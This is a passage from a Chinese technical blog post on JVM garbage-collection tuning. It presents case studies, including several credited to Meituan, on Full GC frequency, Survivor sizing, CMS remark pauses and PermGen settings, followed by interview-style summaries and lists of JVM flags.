<strong>解决方案：</strong></p>\n<ol>\n<li><p><strong>代码优化</strong>：进行代码审查和性能分析，发现并优化存在不必要的循环操作和资源竞争问题，以减少CPU占用。</p>\n</li>\n<li><p><strong>堆内存调整</strong>：增加堆内存大小，减少GC的频率，提高系统的吞吐量和稳定性，确保系统能够应对增加的玩家数量。</p>\n</li>\n<li><p><strong>GC算法调优</strong>：根据系统负载情况和硬件环境，选择合适的GC算法，并调整相应的参数，以减少GC造成的性能损耗。例如，针对大堆内存和高并发情况，可以考虑使用并行GC或G1收集器，并根据具体情况调整相关参数以提升性能。</p>\n</li>\n</ol>\n<h3 id=\"案例3：数据分析平台系统频繁-Full-GC\"><a href=\"#案例3：数据分析平台系统频繁-Full-GC\" class=\"headerlink\" title=\"案例3：数据分析平台系统频繁 Full GC\"></a>案例3：数据分析平台系统频繁 Full GC</h3><p><strong>问题描述：</strong> 数据分析平台对用户在App中的行为进行定时分析统计，但系统频繁发生Full GC，导致页面打开卡顿，影响用户体验。 <strong>问题分析：</strong></p>\n<ol>\n<li><p><strong>CMS GC算法使用</strong>：系统使用CMS（Concurrent Mark-Sweep）GC算法，但频繁的Full GC表明GC调优方面存在问题。</p>\n</li>\n<li><p><strong>Young GC后存活对象进入老年代</strong>：使用jstat命令监控发现，每次Young GC后大约有10%的存活对象进入老年代，这意味着Survivor区空间可能设置过小，导致存活对象在Survivor区放不下而提前进入老年代。</p>\n</li>\n</ol>\n<p><strong>解决方案：</strong></p>\n<ol>\n<li><p><strong>调整Survivor区大小</strong>：增大Survivor区大小，确保其能容纳Young GC后的存活对象，使存活对象能在Survivor区经历多次Young GC达到年龄阈值后才进入老年代。</p>\n</li>\n<li><p><strong>优化存活对象进入老年代的大小</strong>：调整Survivor区大小后，每次Young GC后进入老年代的存活对象稳定在几百KB左右，大大降低了Full GC的频率，提升了系统的稳定性和性能。</p>\n</li>\n</ol>\n<h3 id=\"案例4：内存飙高问题定位\"><a href=\"#案例4：内存飙高问题定位\" class=\"headerlink\" title=\"案例4：内存飙高问题定位\"></a>案例4：内存飙高问题定位</h3><p><strong>问题描述</strong>：在Java进程中，内存飙高，可能是由于大量对象创建或内存泄漏导致的。</p>\n<p>持续的内存飙高可能表明垃圾回收跟不上对象创建速度，或存在内存泄漏导致对象无法回收。 <strong>问题分析：</strong></p>\n<ol>\n<li><strong>观察垃圾回收情况：</strong></li>\n</ol>\n<ul>\n<li><p>使用 <strong>jstat -gc PID 1000</strong> 命令观察GC次数、时间等信息，每隔一秒打印一次。</p>\n</li>\n<li><p>使用 <strong>jmap -histo PID | head -20</strong> 命令查看堆内存占用空间最大的前20个对象类型。</p>\n</li>\n<li><p>如果GC频率高且每次回收的内存空间正常，可能是对象创建速度过快导致内存占用高；如果每次回收的内存很少，可能是内存泄漏。</p>\n</li>\n</ul>\n<ol start=\"3\">\n<li><strong>导出堆内存文件快照：</strong></li>\n</ol>\n<ul>\n<li>使用 <strong>jmap -dump:live,format&#x3D;b,file&#x3D;&#x2F;home&#x2F;myheapdump.hprof PID</strong> 命令将堆内存信息导出到文件，以进一步分析内存占用情况。</li>\n</ul>\n<p><strong>解决方案：</strong> 通过使用VisualVM对dump文件进行离线分析，识别内存占用较高的对象，并进一步定位到创建这些对象的业务代码位置，以便从代码和业务场景中精确定位具体问题。</p>\n<h3 id=\"案例5：Major-GC和Minor-GC频繁\"><a href=\"#案例5：Major-GC和Minor-GC频繁\" class=\"headerlink\" title=\"案例5：Major GC和Minor GC频繁\"></a>案例5：Major GC和Minor GC频繁</h3><p>这个案例，来自美团技术官网</p>\n<h4 id=\"确定目标\"><a href=\"#确定目标\" class=\"headerlink\" title=\"确定目标\"></a>确定目标</h4><p>服务情况：Minor GC每分钟100次 ，Major GC每4分钟一次，单次Minor GC耗时25ms，单次Major GC耗时200ms，接口响应时间50ms。</p>\n<p>由于这个服务要求低延时高可用，结合上文中提到的GC对服务响应时间的影响，计算可知由于Minor GC的发生，12.5%的请求响应时间会增加，其中8.3%的请求响应时间会增加25ms，可见当前GC情况对响应时间影响较大。</p>\n<p><em>（50ms+25ms）× 100次&#x2F;60000ms &#x3D; 12.5%，50ms × 100次&#x2F;60000ms &#x3D; 8.3%</em> 。</p>\n<p>优化目标：降低TP99、TP90时间。</p>\n<h4 id=\"优化\"><a href=\"#优化\" class=\"headerlink\" title=\"优化\"></a>优化</h4><p>首先优化Minor GC频繁问题。通常情况下，由于新生代空间较小，Eden区很快被填满，就会导致频繁Minor GC，因此可以通过增大新生代空间来降低Minor GC的频率。例如在相同的内存分配率的前提下，新生代中的Eden区增加一倍，Minor GC的次数就会减少一半。</p>\n<p>这时很多人有这样的疑问，扩容Eden区虽然可以减少Minor GC的次数，但会增加单次Minor GC时间么？根据上面公式，如果单次Minor GC时间也增加，很难保证最后的优化效果。</p>\n<p>结合下面情况来分析，单次Minor GC时间主要受哪些因素影响？是否和新生代大小存在线性关系？</p>\n<p>首先，单次Minor GC时间由以下两部分组成：T1（扫描新生代）和 T2（复制存活对象到Survivor区）如下图。（注：这里为了简化问题，我们认为T1只扫描新生代判断对象是否存活的时间，其实该阶段还需要扫描部分老年代，后面案例中有详细描述。）</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/14.png\"></p>\n<ul>\n<li><p>扩容前：新生代容量为R ，假设对象A的存活时间为750ms，Minor GC间隔500ms，那么本次Minor GC时间&#x3D; T1（扫描新生代R）+T2（复制对象A到S）。</p>\n</li>\n<li><p>扩容后：新生代容量为2R ，对象A的生命周期为750ms，那么Minor GC间隔增加为1000ms，此时Minor GC对象A已不再存活，不需要把它复制到Survivor区，那么本次GC时间 &#x3D; 2 × T1（扫描新生代R），没有T2复制时间。</p>\n</li>\n</ul>\n<p>可见，扩容后，Minor GC时增加了T1（扫描时间），但省去T2（复制对象）的时间，更重要的是对于虚拟机来说，复制对象的成本要远高于扫描成本，所以，单次<strong>Minor GC时间更多取决于GC后存活对象的数量，而非Eden区的大小</strong>。因此如果堆中短期对象很多，那么扩容新生代，单次Minor GC时间不会显著增加。下面需要确认下服务中对象的生命周期分布情况：</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/15.png\"><br>通过上图GC日志中两处红色框标记内容可知：</p>\n<ol>\n<li><p>new threshold &#x3D; 2（动态年龄判断，对象的晋升年龄阈值为2），对象仅经历2次Minor GC后就晋升到老年代，这样老年代会迅速被填满，直接导致了频繁的Major GC。</p>\n</li>\n<li><p>Major GC后老年代使用空间为300M+，意味着此时绝大多数(86% &#x3D; 2G&#x2F;2.3G)的对象已经不再存活，也就是说生命周期长的对象占比很小。</p>\n</li>\n</ol>\n<p>由此可见，服务中存在大量短期临时对象，扩容新生代空间后，Minor GC频率降低，对象在新生代得到充分回收，只有生命周期长的对象才进入老年代。这样老年代增速变慢，Major GC频率自然也会降低。</p>\n<h4 id=\"优化结果\"><a href=\"#优化结果\" class=\"headerlink\" title=\"优化结果\"></a>优化结果</h4><p>通过扩容新生代为为原来的三倍，单次Minor GC时间增加小于5ms，频率下降了60%，服务响应时间TP90，TP99都下降了10ms+，服务可用性得到提升。</p>\n<p>调整前：<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/16.png\"><br>调整后：<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/17.png\"></p>\n<h4 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>如何选择各分区大小应该依赖应用程序中<strong>对象生命周期的分布情况：如果应用存在大量的短期对象，应该选择较大的年轻代；如果存在相对较多的持久对象，老年代应该适当增大。</strong></p>\n<h4 id=\"更多思考\"><a href=\"#更多思考\" class=\"headerlink\" title=\"更多思考\"></a>更多思考</h4><p>关于上文中提到晋升年龄阈值为2，很多同学有疑问，为什么设置了MaxTenuringThreshold&#x3D;15，对象仍然仅经历2次Minor GC，就晋升到老年代？这里涉及到“动态年龄计算”的概念。</p>\n<p><strong>动态年龄计算</strong>：</p>\n<p>Hotspot遍历所有对象时，按照年龄从小到大对其所占用的大小进行累积，当累积的某个年龄大小超过了survivor区的一半时，取这个年龄和MaxTenuringThreshold中更小的一个值，作为新的晋升年龄阈值。在本案例中，调优前：Survivor区 &#x3D; 64M，desired survivor &#x3D; 32M，此时Survivor区中age&lt;&#x3D;2的对象累计大小为41M，41M大于32M，所以晋升年龄阈值被设置为2，下次Minor GC时将年龄超过2的对象被晋升到老年代。</p>\n<p>JVM引入动态年龄计算，主要基于如下两点考虑：</p>\n<ol>\n<li><p>如果固定按照MaxTenuringThreshold设定的阈值作为晋升条件：</p>\n<p>a）MaxTenuringThreshold设置的过大，原本应该晋升的对象一直停留在Survivor区，直到Survivor区溢出，一旦溢出发生，Eden+Svuvivor中对象将不再依据年龄全部提升到老年代，这样对象老化的机制就失效了。</p>\n<p>b）MaxTenuringThreshold设置的过小，“过早晋升”即对象不能在新生代充分被回收，大量短期对象被晋升到老年代，老年代空间迅速增长，引起频繁的Major GC。分代回收失去了意义，严重影响GC性能。</p>\n</li>\n<li><p>相同应用在不同时间的表现不同：特殊任务的执行或者流量成分的变化，都会导致对象的生命周期分布发生波动，那么固定的阈值设定，因为无法动态适应变化，会造成和上面相同的问题。</p>\n</li>\n</ol>\n<p>总结来说，为了更好的适应不同程序的内存情况，虚拟机并不总是要求对象年龄必须达到Maxtenuringthreshhold再晋级老年代。</p>\n<h3 id=\"美团案例6-请求高峰期发生GC，导致服务可用性下降\"><a href=\"#美团案例6-请求高峰期发生GC，导致服务可用性下降\" class=\"headerlink\" title=\"美团案例6: 请求高峰期发生GC，导致服务可用性下降\"></a>美团案例6: 请求高峰期发生GC，导致服务可用性下降</h3><p>这个案例，来自美团技术官网</p>\n<h4 id=\"确定目标-1\"><a href=\"#确定目标-1\" class=\"headerlink\" title=\"确定目标\"></a>确定目标</h4><p>GC日志显示，高峰期CMS在重标记（Remark）阶段耗时1.39s。</p>\n<p>Remark阶段是Stop-The-World（以下简称为STW）的，即在执行垃圾回收时，Java应用程序中除了垃圾回收器线程之外其他所有线程都被挂起，意味着在此期间，用户正常工作的线程全部被暂停下来，这是低延时服务不能接受的。本次优化目标是降低Remark时间。</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/18.png\"></p>\n<h4 id=\"优化-1\"><a href=\"#优化-1\" class=\"headerlink\" title=\"优化\"></a>优化</h4><p>解决问题前，先回顾一下CMS的四个主要阶段，以及各个阶段的工作内容。下图展示了CMS各个阶段可以标记的对象，用不同颜色区分。</p>\n<ol>\n<li><p>Init-mark初始标记(STW) ，该阶段进行可达性分析，标记GC ROOT能直接关联到的对象，所以很快。</p>\n</li>\n<li><p>Concurrent-mark并发标记，由前阶段标记过的绿色对象出发，所有可到达的对象都在本阶段中标记。</p>\n</li>\n<li><p>Remark重标记(STW) ，暂停所有用户线程，重新扫描堆中的对象，进行可达性分析，标记活着的对象。因为并发标记阶段是和用户线程并发执行的过程，所以该过程中可能有用户线程修改某些活跃对象的字段，指向了一个未标记过的对象，如下图中红色对象在并发标记开始时不可达，但是并行期间引用发生变化，变为对象可达，这个阶段需要重新标记出此类对象，防止在下一阶段被清理掉，这个过程也是需要STW的。特别需要注意一点，这个阶段是以新生代中对象为根来判断对象是否存活的。</p>\n</li>\n<li><p>并发清理，进行并发的垃圾清理。</p>\n</li>\n</ol>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/19.png\"><br>可见，Remark阶段主要是通过扫描堆来判断对象是否存活。那么准确判断对象是否存活，需要扫描哪些对象？CMS对老年代做回收，Remark阶段仅扫描老年代是否可行？结论是不可行，原因如下：<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/20.png\"><br>如果仅扫描老年代中对象，即以老年代中对象为根，判断对象是否存在引用，上图中，对象A因为引用存在新生代中，它在Remark阶段就不会被修正标记为可达，GC时会被错误回收。</p>\n<p>新生代对象持有老年代中对象的引用，这种情况称为<strong>“跨代引用”</strong>。因它的存在，Remark阶段必须扫描整个堆来判断对象是否存活，包括图中灰色的不可达对象。</p>\n<p>灰色对象已经不可达，但仍然需要扫描的原因：<strong>新生代GC和老年代的GC是各自分开独立进行的</strong>，只有Minor GC时才会使用根搜索算法，标记新生代对象是否可达，也就是说虽然一些对象已经不可达，但在Minor GC发生前不会被标记为不可达，CMS也无法辨认哪些对象存活，只能全堆扫描（新生代+老年代）。</p>\n<p>由此可见堆中对象的数目影响了Remark阶段耗时。 分析GC日志可以得出同样的规律，Remark耗时&gt;500ms时，新生代使用率都在75%以上。这样降低Remark阶段耗时问题转换成如何减少新生代对象数量。</p>\n<p>新生代中对象的特点是“朝生夕灭”，这样如果Remark前执行一次Minor GC，大部分对象就会被回收。</p>\n<p>CMS就采用了这样的方式，在Remark前增加了一个可中断的并发预清理（CMS-concurrent-abortable-preclean），该阶段主要工作仍然是并发标记对象是否存活，只是这个过程可被中断。</p>\n<p>此阶段在Eden区使用超过2M时启动，当然2M是默认的阈值，可以通过参数修改。如果此阶段执行时等到了Minor GC，那么上述灰色对象将被回收，Reamark阶段需要扫描的对象就少了。</p>\n<p>除此之外CMS为了避免这个阶段没有等到Minor GC而陷入无限等待，提供了参数CMSMaxAbortablePrecleanTime ，默认为5s，含义是如果可中断的预清理执行超过5s，不管发没发生Minor GC，都会中止此阶段，进入Remark。</p>\n<p>根据GC日志红色标记2处显示，可中断的并发预清理执行了5.35s，超过了设置的5s被中断，期间没有等到Minor GC ，所以Remark时新生代中仍然有很多对象。</p>\n<p>对于这种情况，CMS提供CMSScavengeBeforeRemark参数，用来保证Remark前强制进行一次Minor GC。</p>\n<h4 id=\"优化结果-1\"><a href=\"#优化结果-1\" class=\"headerlink\" title=\"优化结果\"></a>优化结果</h4><p>经过增加CMSScavengeBeforeRemark参数，单次执行时间&gt;200ms的GC停顿消失，从监控上观察，GCtime和业务波动保持一致，不再有明显的毛刺。<br><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/21.png\"></p>\n<h4 id=\"小结-1\"><a href=\"#小结-1\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>通过案例分析了解到，由于跨代引用的存在，CMS在Remark阶段必须扫描整个堆，同时为了避免扫描时新生代有很多对象，增加了可中断的预清理阶段用来等待Minor GC的发生。只是该阶段有时间限制，如果超时等不到Minor GC，Remark时新生代仍然有很多对象，我们的调优策略是，通过参数强制Remark前进行一次Minor GC，从而降低Remark阶段的时间。</p>\n<h4 id=\"更多思考-1\"><a href=\"#更多思考-1\" class=\"headerlink\" title=\"更多思考\"></a>更多思考</h4><p>案例中只涉及老年代GC，其实新生代GC存在同样的问题，即老年代可能持有新生代对象引用，所以Minor GC时也必须扫描老年代。</p>\n<p><strong>JVM是如何避免Minor GC时扫描全堆的？</strong> 经过统计信息显示，老年代持有新生代对象引用的情况不足1%，根据这一特性JVM引入了卡表（card table）来实现这一目的。如下图所示：</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/22.png\"><br><strong>卡表</strong>的具体策略是将老年代的空间分成大小为512B的若干张卡（card）。卡表本身是单字节数组，数组中的每个元素对应着一张卡，当发生老年代引用新生代时，虚拟机将该卡对应的卡表元素设置为适当的值。如上图所示，卡表3被标记为脏（卡表还有另外的作用，标识并发标记阶段哪些块被修改过），之后Minor GC时通过扫描卡表就可以很快的识别哪些卡中存在老年代指向新生代的引用。这样虚拟机通过空间换时间的方式，避免了全堆扫描。</p>\n<p>总结来说，CMS的设计聚焦在获取最短的时延，为此它“不遗余力”地做了很多工作，包括尽量让应用程序和GC线程并发、增加可中断的并发预清理阶段、引入卡表等，虽然这些操作牺牲了一定吞吐量但获得了更短的回收停顿时间。</p>\n<h3 id=\"美团案例7：发生Stop-The-World的GC\"><a href=\"#美团案例7：发生Stop-The-World的GC\" class=\"headerlink\" title=\"美团案例7：发生Stop-The-World的GC\"></a>美团案例7：发生Stop-The-World的GC</h3><p>这个案例，来自美团技术官网</p>\n<h4 id=\"确定目标-2\"><a href=\"#确定目标-2\" class=\"headerlink\" title=\"确定目标\"></a>确定目标</h4><p>GC日志如下图（在GC日志中，Full GC是用来说明这次垃圾回收的停顿类型，代表STW类型的GC，并不特指老年代GC），根据GC日志可知本次Full GC耗时1.23s。这个在线服务同样要求低时延高可用。</p>\n<p>本次优化目标是降低单次STW回收停顿时间，提高可用性。</p>\n<p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/23.png\"></p>\n<h4 id=\"优化-2\"><a href=\"#优化-2\" class=\"headerlink\" title=\"优化\"></a>优化</h4><p>首先，什么时候可能会触发STW的Full GC呢？</p>\n<ol>\n<li><p>Perm空间不足；</p>\n</li>\n<li><p>CMS GC时出现promotion failed和concurrent mode failure（concurrent mode failure发生的原因一般是CMS正在进行，但是由于老年代空间不足，需要尽快回收老年代里面的不再被使用的对象，这时停止所有的线程，同时终止CMS，直接进行Serial Old GC）；</p>\n</li>\n<li><p>统计得到的Young GC晋升到老年代的平均大小大于老年代的剩余空间；</p>\n</li>\n<li><p>主动触发Full GC（执行jmap -histo:live [pid]）来避免碎片问题。</p>\n</li>\n</ol>\n<p>然后，我们来逐一分析一下：</p>\n<ul>\n<li><p>排除原因2：如果是原因2中两种情况，日志中会有特殊标识，目前没有。</p>\n</li>\n<li><p>排除原因3：根据GC日志，当时老年代使用量仅为20%，也不存在大于2G的大对象产生。</p>\n</li>\n<li><p>排除原因4：因为当时没有相关命令执行。</p>\n</li>\n<li><p>锁定原因1：根据日志发现Full GC后，Perm区变大了，推断是由于永久代空间不足容量扩展导致的。</p>\n</li>\n</ul>\n<p>找到原因后解决方法有两种：</p>\n<ol>\n<li><p>通过把-XX:PermSize参数和-XX:MaxPermSize设置成一样，强制虚拟机在启动的时候就把永久代的容量固定下来，避免运行时自动扩容。</p>\n</li>\n<li><p>CMS默认情况下不会回收Perm区，通过参数CMSPermGenSweepingEnabled、CMSClassUnloadingEnabled ，可以让CMS在Perm区容量不足时对其回收。</p>\n</li>\n</ol>\n<p>由于该服务没有生成大量动态类，回收Perm区收益不大，所以我们采用方案1，启动时将Perm区大小固定，避免进行动态扩容。</p>\n<h4 id=\"优化结果-2\"><a href=\"#优化结果-2\" class=\"headerlink\" title=\"优化结果\"></a>优化结果</h4><p>调整参数后，服务不再有Perm区扩容导致的STW GC发生。</p>\n<h4 id=\"小结-2\"><a href=\"#小结-2\" class=\"headerlink\" title=\"小结\"></a>小结</h4><p>对于性能要求很高的服务，建议将MaxPermSize和MinPermSize设置成一致（JDK8开始，Perm区完全消失，转而使用元空间。而元空间是直接存在内存中，不在JVM中），Xms和Xmx也设置为相同，这样可以减少内存自动扩容和收缩带来的性能损失。虚拟机启动的时候就会把参数中所设定的内存全部化为私有，即使扩容前有一部分内存不会被用户代码用到，这部分内存在虚拟机中被标识为虚拟内存，也不会交给其他进程使用。</p>\n<h2 id=\"八：JVM调优常见面试题的精简答案\"><a href=\"#八：JVM调优常见面试题的精简答案\" class=\"headerlink\" title=\"八：JVM调优常见面试题的精简答案\"></a>八：JVM调优常见面试题的精简答案</h2><h4 id=\"8-1、调优包括哪些维度？\"><a href=\"#8-1、调优包括哪些维度？\" class=\"headerlink\" title=\"8. 1、调优包括哪些维度？\"></a>8. 1、调优包括哪些维度？</h4><p>架构调优、代码调优、JVM调优、数据库调优、操作系统调优等</p>\n<p>架构调优和代码调优是JVM调优的基础，其中<strong>架构调优是对系统影响最大的</strong></p>\n<h4 id=\"8-2、何时进行JVM调优\"><a href=\"#8-2、何时进行JVM调优\" class=\"headerlink\" title=\"8.2、何时进行JVM调优\"></a>8.2、何时进行JVM调优</h4><ul>\n<li><p>Heap内存（老年代）持续上涨达到设置的最大内存值；</p>\n</li>\n<li><p>Full GC 次数频繁；</p>\n</li>\n<li><p>GC 停顿时间过长（超过1秒）；</p>\n</li>\n<li><p>应用出现OutOfMemory等内存异常；</p>\n</li>\n<li><p>应用中有使用本地缓存且占用大量内存空间；</p>\n</li>\n<li><p>系统吞吐量与响应性能不高或不降；</p>\n</li>\n</ul>\n<h4 id=\"8-3、JVM调优的基本原则\"><a href=\"#8-3、JVM调优的基本原则\" class=\"headerlink\" title=\"8.3、JVM调优的基本原则\"></a>8.3、JVM调优的基本原则</h4><ul>\n<li><p>大多数的Java应用不需要进行JVM优化；</p>\n</li>\n<li><p>大多数导致GC问题的原因是代码层面的问题导致的（代码层面）；</p>\n</li>\n<li><p>上线之前，应先考虑将机器的JVM参数设置到最优；</p>\n</li>\n<li><p>减少创建对象的数量（代码层面）；</p>\n</li>\n<li><p>减少使用全局变量和大对象（代码层面）；</p>\n</li>\n<li><p>优先架构调优和代码调优，JVM优化是不得已的手段（代码、架构层面）；</p>\n</li>\n<li><p>分析GC情况优化代码比优化JVM参数更好（代码层面）</p>\n</li>\n</ul>\n<p><strong>其实最有效的优化手段是架构和代码层面的优化，而JVM优化则是最后不得已的手段，也可以说是对服务器配置的最后一次“压榨”</strong></p>\n<h4 id=\"8-4、JVM调优目标\"><a href=\"#8-4、JVM调优目标\" class=\"headerlink\" title=\"8.4、JVM调优目标\"></a>8.4、JVM调优目标</h4><p>目的都是为了令应用程序使用最小的硬件消耗来承载更大的吞吐。JVM调优主要是针对垃圾收集器的收集性能优化，令运行在虚拟机上的应用能够使用更少的内存以及延迟获取更大的吞吐量，总结以下：</p>\n<ul>\n<li><p>延迟：GC低停顿和GC低频率；</p>\n</li>\n<li><p>低内存占用；</p>\n</li>\n<li><p>高吞吐量。</p>\n</li>\n</ul>\n<h4 id=\"8-5、JVM调优量化目标\"><a href=\"#8-5、JVM调优量化目标\" class=\"headerlink\" title=\"8.5、JVM调优量化目标\"></a>8.5、JVM调优量化目标</h4><ul>\n<li><p>Heap 内存使用率 &lt;&#x3D; 70%;</p>\n</li>\n<li><p>Old generation 内存使用率 &lt;&#x3D; 70%;</p>\n</li>\n<li><p>avgpause &lt;&#x3D; 1秒;</p>\n</li>\n<li><p>Full GC 次数 0 或 avg pause interval &gt;&#x3D; 24小时。</p>\n</li>\n</ul>\n<h4 id=\"8-6、JVM调优的步骤\"><a href=\"#8-6、JVM调优的步骤\" class=\"headerlink\" title=\"8.6、JVM调优的步骤\"></a>8.6、JVM调优的步骤</h4><ul>\n<li><p>分析GC日志及dump文件，判断是否需要优化，确定瓶颈问题点；</p>\n</li>\n<li><p>确定JVM调优量化目标；</p>\n</li>\n<li><p>确定JVM调优参数（根据历史JVM参数来调整）；</p>\n</li>\n<li><p>依次调优内存、延迟、吞吐量等指标；</p>\n</li>\n<li><p>对比观察调优前后的差异；</p>\n</li>\n<li><p>不断的分析和调整，直到找到合适的JVM参数配置；</p>\n</li>\n<li><p>找到最合适的参数，将这些参数应用到所有服务器，并进行后续跟踪。</p>\n</li>\n</ul>\n<h4 id=\"8-7、VM参数解析及调优\"><a href=\"#8-7、VM参数解析及调优\" class=\"headerlink\" title=\"8.7、VM参数解析及调优\"></a>8.7、VM参数解析及调优</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\-Xmx4g   </span><br><span class=\"line\">–Xms4g   </span><br><span class=\"line\">–Xmn1200m   </span><br><span class=\"line\">–Xss512k   </span><br><span class=\"line\">\\-XX:NewRatio=4   </span><br><span class=\"line\">\\-XX:SurvivorRatio=8   </span><br><span class=\"line\">\\-XX:PermSize=100m   </span><br><span class=\"line\">\\-XX:MaxPermSize=256m   </span><br><span class=\"line\">\\-XX:MaxTenuringThreshold=15  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ul>\n<li><p>-Xmx4g：堆内存最大值为4GB。</p>\n</li>\n<li><p>-Xms4g：初始化堆内存大小为4GB。</p>\n</li>\n<li><p>-Xmn1200m：<strong>设置年轻代大小为1200MB</strong>。增大年轻代后，将会减小年老代大小。此值对系统性能影响较大，Sun官方推荐配置为整个堆的3&#x2F;8。</p>\n</li>\n<li><p>-Xss512k：<strong>设置每个线程的堆栈大小</strong>。JDK5.0以后每个线程堆栈大小为1MB，以前每个线程堆栈大小为256K。应根据应用线程所需内存大小进行调整。在相同物理内存下，减小这个值能生成更多的线程。但是操作系统对一个进程内的线程数还是有限制的，不能无限生成，经验值在3000~5000左右。</p>\n</li>\n<li><p>-XX:NewRatio&#x3D;4：<strong>设置年轻代（包括Eden和两个Survivor区）与年老代的比值（除去持久代）</strong>。设置为4，则年轻代与年老代所占比值为1：4，年轻代占整个堆栈的1&#x2F;5</p>\n</li>\n<li><p>-XX:SurvivorRatio&#x3D;8：<strong>设置年轻代中Eden区与Survivor区的大小比值</strong>。设置为8，则两个Survivor区与一个Eden区的比值为2:8，一个Survivor区占整个年轻代的1&#x2F;10</p>\n</li>\n<li><p>-XX:PermSize&#x3D;100m：初始化永久代大小为100MB。</p>\n</li>\n<li><p>-XX:MaxPermSize&#x3D;256m：设置持久代大小为256MB。</p>\n</li>\n<li><p>-XX:MaxTenuringThreshold&#x3D;15：<strong>设置垃圾最大年龄</strong>。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。</p>\n</li>\n</ul>\n<p><strong>可调优参数：</strong></p>\n<ul>\n<li><p>-Xms：初始化堆内存大小，默认为物理内存的1&#x2F;64(小于1GB)。</p>\n</li>\n<li><p>-Xmx：<strong>堆内存最大值</strong>。默认(MaxHeapFreeRatio参数可以调整)空余堆内存大于70%时，JVM会减少堆直到-Xms的最小限制。</p>\n</li>\n<li><p>-Xmn：新生代大小，包括Eden区与2个Survivor区。</p>\n</li>\n<li><p>-XX:SurvivorRatio&#x3D;1：Eden区与一个Survivor区比值为1:1。</p>\n</li>\n<li><p>-XX:MaxDirectMemorySize&#x3D;1G：<strong>直接内存</strong>。报java.lang.OutOfMemoryError: Direct buffer memory异常可以上调这个值。</p>\n</li>\n<li><p>-XX:+DisableExplicitGC：禁止运行期显式地调用System.gc()来触发fulll GC。</p>\n</li>\n<li><p>注意: Java RMI的定时GC触发机制可通过配置-Dsun.rmi.dgc.server.gcInterval&#x3D;86400来控制触发的时间。</p>\n</li>\n<li><p>-XX:CMSInitiatingOccupancyFraction&#x3D;60：老年代内存回收阈值，默认值为68。</p>\n</li>\n<li><p>-XX:ConcGCThreads&#x3D;4：CMS垃圾回收器并行线程线，推荐值为CPU核心数。</p>\n</li>\n<li><p>-XX:ParallelGCThreads&#x3D;8：新生代并行收集器的线程数。</p>\n</li>\n<li><p>-XX:MaxTenuringThreshold&#x3D;10：<strong>设置垃圾最大年龄</strong>。如果设置为0的话，则年轻代对象不经过Survivor区，直接进入年老代。对于年老代比较多的应用，可以提高效率。如果将此值设置为一个较大值，则年轻代对象会在Survivor区进行多次复制，这样可以增加对象再年轻代的存活时间，增加在年轻代即被回收的概论。</p>\n</li>\n<li><p>-XX:CMSFullGCsBeforeCompaction&#x3D;4：指定进行多少次fullGC之后，进行tenured区 内存空间压缩。</p>\n</li>\n<li><p>-XX:CMSMaxAbortablePrecleanTime&#x3D;500：当abortable-preclean预清理阶段执行达到这个时间时就会结束。</p>\n</li>\n</ul>\n<h4 id=\"8-8、内存调优示例\"><a href=\"#8-8、内存调优示例\" class=\"headerlink\" title=\"8.8、内存调优示例\"></a>8.8、内存调优示例</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\-XX:+PrintGC 　　输出GC日志  </span><br><span class=\"line\">\\-XX:+PrintGCDetails 输出GC的详细日志  </span><br><span class=\"line\">\\-XX:+PrintGCTimeStamps 输出GC的时间戳（以基准时间的形式）  </span><br><span class=\"line\">\\-XX:+PrintGCDateStamps 输出GC的时间戳（以日期的形式，如 2013-05-04T21:53:59.234+0800）  </span><br><span class=\"line\">\\-XX:+PrintHeapAtGC 　　在进行GC的前后打印出堆的信息  </span><br><span class=\"line\">\\-Xloggc:../logs/gc.log 日志文件的输出路径  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p><img src=\"/./2024/06/16/JVM%E5%A6%82%E4%BD%95%E8%B0%83%E4%BC%98/24.png\"></p>\n<ul>\n<li><p>java heap：参数-Xms和-Xmx，建议扩大至3-4倍FullGC后的老年代空间占用。</p>\n</li>\n<li><p>永久代：-XX:PermSize和-XX:MaxPermSize，建议扩大至1.2-1.5倍FullGc后的永久代空间占用。</p>\n</li>\n<li><p>新生代：-Xmn，建议扩大至1-1.5倍FullGC之后的老年代空间占用。</p>\n</li>\n<li><p>老年代：2-3倍FullGC后的老年代空间占用。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\\-Xms373m -Xmx373m //4\\*93=372  </span><br><span class=\"line\">\\-Xmn140m //1.5\\*93=139.5  </span><br><span class=\"line\">\\-XX:PermSize=5m -XX:MaxPermSize=5m //1.5\\*3=4.5  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></li>\n</ul>\n<h2 